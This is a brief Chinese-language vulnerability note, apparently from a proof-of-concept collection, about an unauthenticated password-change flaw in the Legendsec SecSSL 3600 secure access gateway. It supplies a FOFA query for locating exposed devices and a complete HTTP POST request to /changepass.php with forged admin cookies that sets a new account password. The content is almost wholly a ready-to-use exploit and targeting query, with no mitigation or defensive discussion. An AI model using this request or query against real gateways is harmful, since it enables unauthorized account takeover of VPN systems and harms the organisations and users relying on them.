## 某神SecSSL3600安全接入网关系统任意密码修改漏洞

网神 SecSSL 3600安全接入网关系统 存在未授权访问漏洞，攻击者通过漏洞可以获取用户列表，并修改用户账号密码

## fofa

```
app="安全接入网关SecSSLVPN"
```

## poc

```yaml
POST /changepass.php?type=2 HTTP/1.1
host:
Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}

old_pass=&password=Test123!@&repassword=Test123!@
```

![image-20240714234418619](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407142344689.png)
